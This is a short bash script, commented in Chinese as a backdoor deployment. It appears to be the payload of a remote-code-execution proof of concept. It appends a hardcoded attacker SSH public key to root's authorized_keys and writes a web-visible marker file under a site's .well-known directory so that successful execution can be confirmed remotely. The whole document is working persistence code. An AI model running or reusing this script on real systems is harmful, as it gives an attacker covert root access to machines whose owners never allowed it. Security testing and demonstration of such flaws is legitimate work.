#!/usr/bin/env bash
# 部署后门: 将攻击者 SSH 公钥写入 root 的 authorized_keys (幂等)
set -e
mkdir -p /root/.ssh && chmod 700 /root/.ssh
touch /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys

KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2rXwDvfaKYgLikYTEGEgsAYfddZq5DqMVvv5FUsEOw poc-attacker@demo'

grep -qF "$KEY" /root/.ssh/authorized_keys || echo "$KEY" >> /root/.ssh/authorized_keys

# 保留 web 可见标记, 便于外部确认执行
echo "[$(id -un)@$(hostname)] $(date -Iseconds)" > /var/www/baimeixiaofan/.well-known/poc-rce.txt
